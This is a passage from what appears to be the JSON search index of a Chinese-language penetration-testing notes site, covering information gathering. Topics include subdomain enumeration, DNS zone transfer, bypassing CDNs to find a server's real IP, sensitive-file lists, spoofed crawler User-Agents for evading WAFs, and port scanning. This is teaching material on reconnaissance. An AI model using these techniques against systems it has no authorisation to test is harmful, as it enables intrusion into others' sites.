ff0c\u5229\u7528\u4e0a\u4f20\u56fe\u7247\u6765\u67e5\u8be2\uff0c\u901a\u8fc7\u641c\u7d22\u51fa\u6765\u7684\u7ed3\u679c\u53ef\u4ee5\u5224\u65ad\u76ee\u6807\u4ea7\u54c1\u548c\u5382\u5546\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#faviconico","title":"favicon.ico","text":"<p>\u9996\u5148\u5148\u6765\u4ecb\u7ecd\u4e00\u4e0b\u4ec0\u4e48favicon.ico\u6587\u4ef6\uff0c\u6240\u8c13favicon\uff0c\u4fbf\u662f\u5176\u53ef\u4ee5\u8ba9\u6d4f\u89c8\u5668\u7684\u6536\u85cf\u5939\u4e2d\u9664\u663e\u793a\u76f8\u5e94\u7684\u6807\u9898\u5916\uff0c\u8fd8\u4ee5\u56fe\u6807\u7684\u65b9\u5f0f\u533a\u522b\u4e0d\u540c\u7684\u7f51\u7ad9\u3002favicon.ico\u4e5f\u88ab\u79f0\u4e3a website icon\uff08\u7f51\u9875\u56fe\u6807\uff09\u3001page icon\uff08\u9875\u9762\u56fe\u6807\uff09\u6216url icon\uff08URL\u56fe\u6807\uff09\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u95ee\u5ea6\u5a18\u3002\u4e0b\u9762\u8fd9\u4e2a\u5c0f\u4e1c\u897f\u5c31\u662f Favicon.ico\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728shodan\u91cc\u5bfb\u627e\u5b83\u7684\u54c8\u5e0c\u5e76\u53bb\u67e5\u627e\u76f8\u5173\u8d44\u4ea7\uff0c\u6253\u5f00shodan\u9875\u9762\uff0c\u6216\u8005\u7528shodan\u63d2\u4ef6\u90fd\u884c\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_11","title":"\u5b50\u57df\u540d\u6536\u96c6","text":""},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#sslhttps","title":"SSL(HTTPS)\u8bc1\u4e66","text":"<p>\u70b9\u51fb\u6d4f\u89c8\u5668\u7f51\u7ad9\u65c1\u8fb9\u7684\u5c0f\u9501\uff0c\u7136\u540e\u70b9\u51fb\u8bc1\u4e66\u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8be5\u7f51\u7ad9\u7684SSL\u8bc1\u4e66\u4e86\u5927\u5382\u5546\u7684SSL\u8bc1\u4e66\u4e00\u822c\u90fd\u300c\u4e00\u8bc1\u591a\u7528\u300d\uff0c\u6839\u636e\u8bc1\u4e66\u900f\u660e\u65e5\u5fd7\u8fd9\u4e2a\u7279\u6027\uff0c\u53ef\u4ee5\u5f97\u77e5\u4e00\u4e9b\u5b50\u57df\u540d\u3002</p> <p>\u6709\u65f6\u5019https\u8bc1\u4e66\u62a5\u9519\u4f1a\u6cc4\u9732\u57df\u540d</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_12","title":"\u5728\u7ebf\u7f51\u7ad9\u8bc1\u4e66\u67e5\u8be2","text":"<ul> <li> <p>https://crt.sh/</p> </li> <li> <p>https://censys.io/</p> </li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_13","title":"\u7f51\u7edc\u6df1\u5ea6\u722c\u866b","text":"<p>\u7f51\u7edc\u722c\u866b\u662f\u4e00\u79cd\u5e38\u7528\u7684\u4fe1\u606f\u6536\u96c6\u5de5\u5177\uff0c\u53ef\u4ee5\u5e2e\u52a9\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u5404\u79cd\u4fe1\u606f\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_14","title":"\u57df\u4f20\u9001\u6f0f\u6d1e","text":"<p>\u57df\u4f20\u9001\u6f0f\u6d1e\u662f\u4e00\u79cd\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u76ee\u6807\u57df\u540d\u7684\u6240\u6709\u8bb0\u5f55\uff0c\u5305\u62ec\u4e3b\u673a\u8bb0\u5f55\u3001MX \u8bb0\u5f55\u3001NS \u8bb0\u5f55\u7b49\u3002\u4ee5\u4e0b\u662f\u5173\u4e8e\u57df\u4f20\u9001\u6f0f\u6d1e\u7684\u5e38\u7528DNS\u8bb0\u5f55\u548c\u68c0\u6d4b\u65b9\u6cd5\uff1a</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns","title":"\u5e38\u7528DNS\u8bb0\u5f55","text":"<ul> <li>\u4e3b\u673a\u8bb0\u5f55(A\u8bb0\u5f55)</li> <li>IPv6\u4e3b\u673a\u8bb0\u5f55(AAAA\u8bb0\u5f55)</li> <li>\u522b\u540d(CNAME\u8bb0\u5f55)</li> <li>\u7535\u5b50\u90ae\u4ef6\u4ea4\u6362\u8bb0\u5f55(MX\u8bb0\u5f55)</li> <li>\u57df\u540d\u670d\u52a1\u5668\u8bb0\u5f55(NS\u8bb0\u5f55)</li> <li>\u53cd\u5411\u8bb0\u5f55(PTR\u8bb0\u5f55)</li> <li>TXT\u8bb0\u5f55</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns_1","title":"DNS\u533a\u57df\u4f20\u9001","text":"<p>DNS\u533a\u57df\u4f20\u9001\u662f\u4e00\u79cd\u4ece\u4e3bDNS\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u4ee5\u66f4\u65b0\u5907\u4efdDNS\u670d\u52a1\u5668\u7684\u673a\u5236\uff0c\u7528\u4e8e\u63d0\u4f9b\u5197\u4f59\u5907\u4efd\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_15","title":"\u57df\u4f20\u9001\u6f0f\u6d1e","text":"<p>\u57df\u4f20\u9001\u6f0f\u6d1e\u6307\u7684\u662f\u5907\u4efdDNS\u670d\u52a1\u5668\u9519\u8bef\u914d\u7f6e\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u83b7\u53d6\u6574\u4e2a\u57df\u7684\u6240\u6709\u8bb0\u5f55\u3002\u6b63\u786e\u7684\u914d\u7f6e\u5e94\u8be5\u9650\u5236\u53ef\u8fdb\u884c\u57df\u4f20\u9001\u7684\u670d\u52a1\u5668\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_16","title":"\u68c0\u6d4b\u65b9\u6cd5","text":"<ul> <li>\u4f7f\u7528nmap\u811a\u672c\u626b\u63cf</li> <li>\u4f7f\u7528dig\u547d\u4ee4</li> <li>\u4f7f\u7528nslookup\u547d\u4ee4</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_17","title":"\u5b50\u57df\u540d\u679a\u4e3e\u7206\u7834","text":"<p>\u901a\u8fc7\u5411DNS\u670d\u52a1\u5668\u53d1\u9001\u5b57\u5178\u91cc\u7684\u5b50\u57df\u540d\u8bf7\u6c42\uff0c\u68c0\u67e5\u8fd4\u56de\u7684\u6570\u636e\u4e2d\u662f\u5426\u5b58\u5728\u8bb0\u5f55\uff0c\u4ece\u800c\u53d1\u73b0\u5b58\u5728\u7684\u5b50\u57df\u540d\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_18","title":"\u5de5\u5177","text":""},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#oneforall","title":"OneForAll","text":"<p>OneForAll \u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5b50\u57df\u540d\u6536\u96c6\u5de5\u5177\uff0c\u63d0\u4f9b\u4e86\u4e00\u952e\u5f0f\u7684\u5b50\u57df\u540d\u6536\u96c6\u529f\u80fd\uff0c\u652f\u6301\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>\u6536\u96c6\u5b50\u57df\u540d</li> <li>\u6536\u96c6\u5b50\u57df\u5e38\u7528\u7aef\u53e3</li> <li>\u6536\u96c6\u5b50\u57dfTitle</li> <li>\u6536\u96c6\u5b50\u57df\u72b6\u6001</li> <li>\u6536\u96c6\u5b50\u57df\u670d\u52a1\u5668\u4fe1\u606f</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#layer","title":"Layer","text":"<p>Layer \u5b50\u57df\u540d\u6316\u6398\u673a\u662f\u4e00\u6b3e\u5f3a\u5927\u7684\u57df\u540d\u67e5\u8be2\u5de5\u5177\uff0c\u63d0\u4f9b\u4e86\u591a\u79cd\u67e5\u8be2\u6a21\u5f0f\u548c\u529f\u80fd\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u53d1\u73b0\u76ee\u6807\u7f51\u7ad9\u7684\u5b50\u57df\u540d\u4fe1\u606f\u3002\u5176\u4e3b\u8981\u7279\u70b9\u5305\u62ec\u7b80\u6d01\u7684\u754c\u9762\u3001\u7b80\u5355\u7684\u64cd\u4f5c\u6a21\u5f0f\u4ee5\u53ca\u591a\u79cd\u67e5\u8be2\u65b9\u5f0f\uff0c\u9002\u7528\u4e8e\u5404\u79cd\u60c5\u51b5\u4e0b\u7684\u57df\u540d\u6316\u6398\u9700\u6c42\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_19","title":"\u4e3b\u8981\u529f\u80fd","text":"<ul> <li>\u300c\u5b50\u57df\u540d\u67e5\u8be2\u670d\u52a1\uff1a\u300d \u63d0\u4f9b\u7f51\u7ad9\u5b50\u57df\u540d\u67e5\u8be2\u670d\u52a1\uff0c\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u5b50\u57df\u540d\u5217\u8868\u3002</li> <li>\u300c\u591a\u79cd\u67e5\u8be2\u6a21\u5f0f\uff1a\u300d \u652f\u6301\u670d\u52a1\u63a5\u53e3\u3001\u66b4\u529b\u641c\u7d22\u3001\u540c\u670d\u6316\u6398\u4e09\u79cd\u67e5\u8be2\u6a21\u5f0f\uff0c\u6ee1\u8db3\u4e0d\u540c\u573a\u666f\u4e0b\u7684\u67e5\u8be2\u9700\u6c42\u3002</li> <li>\u300c\u5bfc\u51fa\u529f\u80fd\uff1a\u300d \u652f\u6301\u5bfc\u51fa\u5404\u79cd\u4fe1\u606f\uff0c\u5305\u62ec\u57df\u540d\u3001IP\u3001CDN\u3001\u5b58\u6d3b\u7f51\u7ad9\u7b49\uff0c\u65b9\u4fbf\u540e\u7eed\u5206\u6790\u548c\u5904\u7406\u3002</li> <li>\u300c\u67e5\u770bWEB\u670d\u52a1\u5668\u4fe1\u606f\uff1a\u300d \u53ef\u4ee5\u67e5\u770b\u6bcf\u4e2a\u5b50\u57df\u540d\u6240\u4f7f\u7528\u7684WEB\u670d\u52a1\u5668\u4fe1\u606f\uff0c\u5e2e\u52a9\u7528\u6237\u7b5b\u9009\u51fa\u7248\u672c\u8f83\u4f4e\u7684\u670d\u52a1\u5668\u3002</li> <li>\u300c\u7aef\u53e3\u626b\u63cf\uff1a\u300d \u53ef\u4ee5\u626b\u63cf\u6bcf\u4e2a\u5b50\u57df\u540d\u5f00\u653e\u7684\u5e38\u89c1\u7aef\u53e3\uff0c\u53d1\u73b0\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_20","title":"\u4f7f\u7528\u5efa\u8bae","text":"<ul> <li>\u5728\u8fdb\u884c\u5b89\u5168\u8bc4\u4f30\u6216\u6e17\u900f\u6d4b\u8bd5\u65f6\uff0c\u53ef\u4ee5\u5229\u7528 Layer \u5b50\u57df\u540d\u6316\u6398\u673a\u5feb\u901f\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u5b50\u57df\u540d\u4fe1\u606f\uff0c\u5e2e\u52a9\u53d1\u73b0\u53ef\u80fd\u5b58\u5728\u7684\u5b89\u5168\u9690\u60a3\u3002</li> <li>\u7ed3\u5408\u5176\u4ed6\u5de5\u5177\u548c\u6280\u672f\uff0c\u5982\u7aef\u53e3\u626b\u63cf\u3001\u6f0f\u6d1e\u5229\u7528\u7b49\uff0c\u8fdb\u4e00\u6b65\u6df1\u5165\u6316\u6398\u76ee\u6807\u7f51\u7ad9\u7684\u5b89\u5168\u6f0f\u6d1e\u548c\u5f31\u70b9\u3002</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_21","title":"\u5fa1\u5251","text":"<p>\u5fa1\u5251\u662f\u4e00\u6b3e\u7f51\u7edc\u5b89\u5168\u68c0\u6d4b\u5de5\u5177\uff0c\u63d0\u4f9b\u4e86\u5b50\u57df\u540d\u626b\u63cf\u3001\u7aef\u53e3\u626b\u63cf\u3001\u7f51\u7ad9\u6f0f\u6d1e\u68c0\u6d4b\u7b49\u591a\u9879\u529f\u80fd\uff0c\u5e2e\u52a9\u7528\u6237\u53d1\u73b0\u548c\u4fee\u590d\u7f51\u7ad9\u7684\u5b89\u5168\u95ee\u9898\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#k8","title":"K8","text":"<p>K8 \u662f\u4e00\u6b3e\u529f\u80fd\u5f3a\u5927\u7684\u5b50\u57df\u540d\u7206\u7834\u5de5\u5177\uff0c\u652f\u6301\u591a\u79cd\u67e5\u8be2\u65b9\u5f0f\u548c\u5b9a\u5236\u5316\u914d\u7f6e\uff0c\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u5feb\u901f\u5730\u53d1\u73b0\u76ee\u6807\u57df\u540d\u7684\u5b50\u57df\u540d\u4fe1\u606f\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ip","title":"IP\u4fe1\u606f\u6536\u96c6","text":"<p>\u5728\u8fdb\u884cIP\u4fe1\u606f\u6536\u96c6\u65f6\uff0c\u9700\u8981\u5148\u5224\u65ad\u76ee\u6807\u57df\u540d\u662f\u5426\u91c7\u7528\u4e86\u5185\u5bb9\u5206\u53d1\u7f51\u7edc\uff08CDN\uff09\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5224\u65adCDN\u7684\u65b9\u6cd5\u548c\u7ed5\u8fc7CDN\u5bfb\u627e\u771f\u5b9eIP\u7684\u6280\u5de7\uff1a</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cdn","title":"CDN\u6982\u5ff5","text":"<p>\u5185\u5bb9\u5206\u53d1\u7f51\u7edc\uff08CDN\uff09\u901a\u8fc7\u4e92\u8054\u7f51\u4e92\u76f8\u8fde\u63a5\u7684\u7535\u8111\u7f51\u7edc\u7cfb\u7edf\uff0c\u5229\u7528\u6700\u9760\u8fd1\u7528\u6237\u7684\u670d\u52a1\u5668\uff0c\u66f4\u5feb\u3001\u66f4\u53ef\u9760\u5730\u5c06\u7f51\u7edc\u5185\u5bb9\u4f20\u9012\u7ed9\u7528\u6237\uff0c\u63d0\u9ad8\u7f51\u7ad9\u7684\u8bbf\u95ee\u901f\u5ea6\u548c\u7a33\u5b9a\u6027\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ip_1","title":"\u5224\u65ad\u662f\u5426\u771f\u5b9eIP","text":"<ul> <li>\u300cnslookup\uff1a\u300d \u4f7f\u7528nslookup\u547d\u4ee4\u6216\u5728\u7ebf\u5de5\u5177\u8fdb\u884c\u67e5\u8be2\uff0c\u5982\u679c\u8fd4\u56de\u591a\u4e2aIP\u5730\u5740\uff0c\u5219\u53ef\u80fd\u91c7\u7528\u4e86CDN\u3002</li> <li>\u300c\u591a\u5730ping\uff1a\u300d \u5728\u7ebf\u5de5\u5177\u5982ping.chinaz.com\u7b49\u8fdb\u884c\u591a\u5730ping\uff0c\u67e5\u770bIP\u662f\u5426\u4e00\u81f4\u3002</li> <li>\u300cIP\u53cd\u67e5\uff1a\u300d \u67e5\u8be2IP\u662f\u5426\u6709\u591a\u4e2a\u57df\u540d\uff0c\u82e5\u662f\uff0c\u5219\u591a\u534a\u4e0d\u662f\u771f\u5b9eIP\u3002</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#cdnip","title":"\u7ed5CDN\u627e\u771f\u5b9eIP","text":"<ul> <li>\u300c\u5b50\u57df\u540d\uff1a\u300d \u67e5\u8be2\u672a\u4f7f\u7528CDN\u524d\u7684DNS\u670d\u52a1\u5668\u89e3\u6790\u8bb0\u5f55\uff0c\u67e5\u770b\u5386\u53f2DNS\u89e3\u6790\u8bb0\u5f55\u3002</li> <li>\u300c\u90ae\u4ef6\u670d\u52a1\u5668\uff1a\u300d \u901a\u8fc7\u90ae\u4ef6\u5934\u4fe1\u606f\u4e2d\u7684\u771f\u5b9eIP\u83b7\u53d6\u3002</li> <li>\u300c\u4fe1\u606f\u6cc4\u6f0f\uff1a\u300d \u67e5\u8be2phpinfo\u9875\u9762\u3001debug\u6a21\u5f0f\u3001\u5176\u4ed6\u4fe1\u606f\u6cc4\u6f0f\u95ee\u9898\uff0c\u83b7\u53d6\u771f\u5b9eIP\u3002</li> <li>\u300c\u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff1a\u300d \u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u5982shadan\u3001fofa\u7b49\u8fdb\u884c\u641c\u7d22\uff0c\u83b7\u53d6\u7f51\u7ad9\u771f\u5b9eIP\u3002</li> <li>\u300c\u5229\u7528SSL\u8bc1\u4e66\u67e5\u8be2\uff1a\u300d \u4f7f\u7528\u5728\u7ebf\u5de5\u5177\u5982Censys\u8fdb\u884cSSL\u8bc1\u4e66\u67e5\u8be2\u3002</li> <li>\u300c\u56fd\u5916\u8bbf\u95ee\uff1a\u300d \u901a\u8fc7\u56fd\u5916\u8282\u70b9\u8fdb\u884c\u8bf7\u6c42\uff0c\u83b7\u53d6\u771f\u5b9eIP\u3002</li> <li>\u300cLTM\u89e3\u7801\u6cd5\uff1a\u300d \u89e3\u7801F5 LTM\u8d1f\u8f7d\u5747\u8861\u7684\u771f\u5b9eIP\u3002</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_22","title":"\u57fa\u672c\u76ee\u5f55\u3001\u654f\u611f\u76ee\u5f55\u53ca\u6587\u4ef6","text":"<p>\u626b\u63cf\u7f51\u7ad9\u76ee\u5f55\u7ed3\u6784\uff0c\u67e5\u770b\u662f\u5426\u53ef\u4ee5\u904d\u5386\u76ee\u5f55\u6216\u654f\u611f\u6587\u4ef6\u6cc4\u9732\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u9700\u8981\u6536\u96c6\u7684\u654f\u611f\u76ee\u5f55/\u6587\u4ef6\u4fe1\u606f\uff1a</p> <ul> <li>robots.txt</li> <li>crossdomain.xml</li> <li>sitemap.xml</li> <li>\u540e\u53f0\u76ee\u5f55</li> <li>\u7f51\u7ad9\u5b89\u88c5\u5305</li> <li>\u7f51\u7ad9\u4e0a\u4f20\u76ee\u5f55</li> <li>MySQL\u7ba1\u7406\u9875\u9762</li> <li>phpinfo</li> <li>\u7f51\u7ad9\u6587\u672c\u7f16\u8f91\u5668</li> <li>\u6d4b\u8bd5\u6587\u4ef6</li> <li>\u7f51\u7ad9\u5907\u4efd\u6587\u4ef6\uff08.rar\u3001.zip\u3001.7z\u3001.tar.gz\u3001.bak\uff09</li> <li>DS_Store \u6587\u4ef6</li> <li>vim\u7f16\u8f91\u5668\u5907\u4efd\u6587\u4ef6\uff08.swp\uff09</li> <li>WEB\u2014INF/web.xml\u6587\u4ef6</li> </ul> <p>\u76ee\u5f55\u626b\u63cf\u53ef\u4ee5\u53d1\u73b0\u7f51\u7ad9\u7684\u5f31\u70b9\uff0c\u4f8b\u5982robots\u6587\u4ef6\u6cc4\u9732\u4e86\u7f51\u7ad9\u7684\u540e\u53f0\u6216CMS\u4fe1\u606f\uff0c\u5b89\u88c5\u5305\u66b4\u9732\u4e86\u7f51\u7ad9\u7684\u6e90\u7801\uff0cphpinfo\u66b4\u9732\u4e86\u670d\u52a1\u5668\u914d\u7f6e\u4fe1\u606f\uff0c\u7f16\u8f91\u5668\u548c\u4e0a\u4f20\u9875\u9762\u53ef\u4ee5\u5229\u7528\u76f8\u5173\u6f0f\u6d1e\u8fdb\u884c\u6e17\u900f\uff0cMySQL\u3001\u540e\u53f0\u7ba1\u7406\u9875\u9762\u53ef\u4ee5\u8fdb\u884c\u679a\u4e3e\u7206\u7834\u7b49\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dirbuster","title":"dirbuster","text":"<p>DirBuster\u662f\u4e00\u4e2a\u7528\u4e8e\u76ee\u5f55\u7206\u7834\u7684\u5de5\u5177\uff0c\u53ef\u4ee5\u5e2e\u52a9\u53d1\u73b0Web\u670d\u52a1\u5668\u4e0a\u9690\u85cf\u7684\u76ee\u5f55\u548c\u6587\u4ef6\u3002</p> <p>\u5728\u8fdb\u884c\u7ad9\u70b9\u626b\u63cf\u65f6\uff0c\u5982\u679c\u7f51\u7ad9\u4f7f\u7528\u4e86Web\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08WAF\uff09\uff0c\u53ef\u80fd\u4f1a\u62e6\u622a\u626b\u63cf\u5de5\u5177\u7684\u8bf7\u6c42\u3002\u8fd9\u65f6\u5019\uff0c\u4fee\u6539User Agent\u503c\u53ef\u4ee5\u7ed5\u8fc7WAF\u7684\u62e6\u622a\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u7528\u7684User Agent\u503c\uff0c\u53ef\u4ee5\u7528\u4e8e\u6b3a\u9a97WAF\uff1a</p> <ul> <li>\u767e\u5ea6\u8718\u86db\u6293\u53d6\u6b3a\u9a97\uff1a Mozilla/5.0 (compatible; Baiduspider/2.0;http://www.baidu.com/search/spider.html)</li> <li>\u8c37\u6b4c\u8718\u86db\u6293\u53d6\u6b3a\u9a97\uff1a Mozilla/5.0 (compatible; Googlebot/2.1;http://www.google.com/bot.html)</li> <li>\u767e\u5ea6\u8f6c\u7801\u6d4f\u89c8\u6b3a\u9a97\uff1a Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729)</li> <li>\u8c37\u6b4c\u8f6c\u7801\u6d4f\u89c8\u6b3a\u9a97\uff1a Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko;Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14</li> </ul> <p>\u901a\u8fc7\u4fee\u6539User Agent\u503c\uff0cDirBuster\u53ef\u4ee5\u6a21\u62df\u8fd9\u4e9b\u8718\u86db\u548c\u6d4f\u89c8\u5668\uff0c\u7ed5\u8fc7WAF\u5bf9\u626b\u63cf\u7684\u9650\u5236\uff0c\u4ece\u800c\u66f4\u597d\u5730\u8fdb\u884c\u76ee\u5f55\u7206\u7834\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#7kbscan","title":"7kbscan","text":"<p>\u5de5\u5177\uff1ahttps://github.com/7kbstorm/7kbscan-WebPathBrute</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_23","title":"\u7aef\u53e3\u626b\u63cf","text":"<p>\u901a\u8fc7\u7aef\u53e3\u626b\u63cf\u53ef\u4ee5\u786e\u5b9a\u7f51\u7ad9\u5f00\u653e\u7684\u670d\u52a1\uff0c\u4e3a\u8fdb\u4e00\u6b65\u7684\u6f0f\u6d1e\u63a2\u6d4b\u548c\u63d0\u6743\u63d0\u4f9b\u91cd\u8981\u4fe1\u606f\u3002\u5e38\u89c1\u7684\u4e00\u4e9b\u5bb9\u6613\u53d1\u751f\u6f0f\u6d1e\u7684\u7aef\u53e3\u5305\u62ec 135\u3001137\u3001138\u3001139\u3001445\u7b49\u3002</p> <p>\u6709\u65f6\u626b\u63cf\u5230\u7684\u7aef\u53e3\u53ef\u80fd\u662f\u7f51\u7ad9\u7684\u65c1\u7ad9\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5bf9\u65c1\u7ad9\u8fdb\u884c\u6f0f\u6d1e\u63a2\u6d4b\u3002\u4f46\u662f\u7ba1\u7406\u5458\u53ef\u80fd\u4f1a\u4fee\u6539\u4e00\u4e9b\u670d\u52a1\u7684\u9ed8\u8ba4\u7aef\u53e3\uff0c\u8fd9\u65f6\u9700\u8981\u624b\u52a8\u5224\u65ad\u548c\u5206\u6790\uff08\u4f8b\u5982\u5c06\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u7684\u9ed8\u8ba4\u7aef\u53e33389\u4fee\u6539\u4e3a8888\uff09\u3002</p> <p>\u5728Windows\u7cfb\u7edf\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u548c\u7ba1\u7406\uff1a</p> <ul> <li>\u663e\u793a\u6240\u6709\u6709\u6548\u8fde\u63a5\u4fe1\u606f\u5217\u8868\uff0c\u5305\u62ec\u5df2\u5efa\u7acb\u7684\u8fde\u63a5\uff08ESTABLISHED\uff09\u3001\u76d1\u542c\u8fde\u63a5\u8bf7\u6c42\uff08LISTENING\uff09\u548c\u65ad\u5f00\u8fde\u63a5\uff08CLOSE_WAIT\uff09\u7b49\u72b6\u6001\uff1a netstat -a</li> <li>\u4ee5\u6570\u5b57\u5f62\u5f0f\u663e\u793a\u5730\u5740\u548c\u7aef\u53e3\u53f7\uff0c\u663e\u793a\u6240\u6709\u5df2\u5efa\u7acb\u7684\u6709\u6548\u8fde\u63a5\uff1a netstat -n</li> <li>\u5217\u51fa\u6240\u6709\u7aef\u53e3\u7684\u60c5\u51b5\uff1a netstat -ano</li> <li>\u67e5\u770b\u88ab\u5360\u7528\u7aef\u53e380\u5bf9\u5e94\u7684\u5e94\u7528\u7684PID\uff1a netstat -ano|findstr \"80\"</li> <li>\u67e5\u770b80\u7aef\u53e3\u88ab\u54ea\u4e2a\u8fdb\u7a0b\u6216\u7a0b\u5e8f\u5360\u7528\uff1a tasklist|findstr \"80\"</li> <li>\u7ed3\u675f\u8be5\u8fdb\u7a0b\u6216\u7a0b\u5e8f\uff1a taskkill /f /t /im XX.exe</li> </ul>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_24","title":"\u5728\u7ebf\u67e5\u8be2\u7f51\u7ad9","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5728\u7ebf\u5de5\u5177\u6765\u8fdb\u884c\u7f51\u7ad9\u7aef\u53e3\u7684\u67e5\u8be2\uff1a 1. CoolAF Port Scanner</p> <ol> <li>Tool.lu Port Scanner</li> </ol> <p>\u8fd9\u4e9b\u5de5\u5177\u53ef\u4ee5\u5e2e\u52a9\u4f60\u5feb\u901f\u4e86\u89e3\u4e00\u4e2a\u7f51\u7ad9\u5f00\u653e\u4e86\u54ea\u4e9b\u7aef\u53e3\uff0c\u6709\u52a9\u4e8e\u53d1\u73b0\u6f5c\u5728\u7684\u5b89\u5168\u9690\u60a3\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_25","title":"\u7aef\u53e3\u626b\u63cf\u5de5\u5177","text":"<p>\u5e38\u7528\u7684\u7aef\u53e3\u626b\u63cf\u5de5\u5177\u5305\u62ec Nmap \u548c Masscan\u3002\u5b83\u4eec\u5404\u6709\u4f18\u52bf\uff1a</p> <ul> <li>\u300cNmap\u300d\uff1a\u626b\u63cf\u51c6\u786e\u6027\u8f83\u9ad8\uff0c\u4f46\u901f\u5ea6\u8f83\u6162\u3002</li> <li>\u300cMasscan\u300d\uff1a\u626b\u63cf\u901f\u5ea6\u5feb\uff0c\u4f46\u51c6\u786e\u6027\u76f8\u5bf9\u8f83\u4f4e\u3002</li> </ul> <p>\u5982\u679c\u7f51\u7ad9\u4f7f\u7528\u4e86WAF\uff08Web \u5e94\u7528\u9632\u706b\u5899\uff09\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u8c03\u6574\u626b\u63cf\u7ebf\u7a0b\uff0c\u6216\u8005\u5229\u7528 FTP \u8fde\u63a5\u5de5\u5177\u3001SSH \u8fde\u63a5\u5de5\u5177\u3001MySQL \u8fde\u63a5\u7b49\u624b\u5de5\u65b9\u5f0f\u8fdb\u884c\u63a2\u6d4b\u3002</p>"},{"location":"WEB/others/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#c","title":"\u65c1\u7ad9C\u6bb5","text":"<p>\u65c1\u7ad9\uff1a\u662f\u548c\u76ee\u6807\u7f51\u7ad9\u5728\u540c\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u7684\u5176\u5b83\u7f51\u7ad9 C\u7aef\uff1a\u662f\u548c\u670d\u52a1\u5668IP\u5904\u5728\u4e00\u4e2aC\u6bb5\u7684\u5176\u4ed6\u670d\u52a1\u5668 